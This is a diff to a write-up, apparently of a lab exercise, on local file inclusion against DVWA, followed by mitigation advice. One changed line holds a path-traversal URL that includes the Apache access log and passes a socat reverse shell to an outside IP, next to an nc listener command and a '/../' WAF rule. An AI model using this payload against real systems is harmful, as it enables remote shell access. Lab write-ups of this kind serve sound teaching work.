@@ -64,7 +64,7 @@ nc -nlvp 1234
 Next, the encoded URL was appended to `/var/log/apache2/access.log` with the `cme` parameter as the following. 
 
 ```url
-127.0.0.1/vulnerabilities/fi/?page=../../../../../../../var/log/apache2/access.log&cmd=socat tcp-connect%3A192.168.45.180%3A1234 exec%3Abash`
+127.0.0.1/vulnerabilities/fi/?page=../../../../../../../var/log/apache2/access.log&cmd=socattcp-connect%3A192.168.45.180%3A1234exec%3Abash`
  ```
 
 As seen below, the tester successfully received a reverse shell. 
@@ -136,5 +136,5 @@ Rule Pattern: /../
 In conclusion, LFI attacks mitigations require implementing a combination of security measures. Restricting file permissions is essential to limit access to sensitive files and directories, preventing unauthorized access. In addition, a robust a whitelist approach ensures that only trusted and intended files are included by the application, reducing the risk of including malicious files. Implementing a Web Application Firewall (WAF) adds an additional layer of defense by detecting and blocking suspicious requests, including those attempting LFI attacks. 
 
 ### Reference: 
-[GrootBoan](https://security.grootboan.com/) 
+[GrootBoan](https://security.grootboan.com/) and
 [Offensive Security](https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/) 
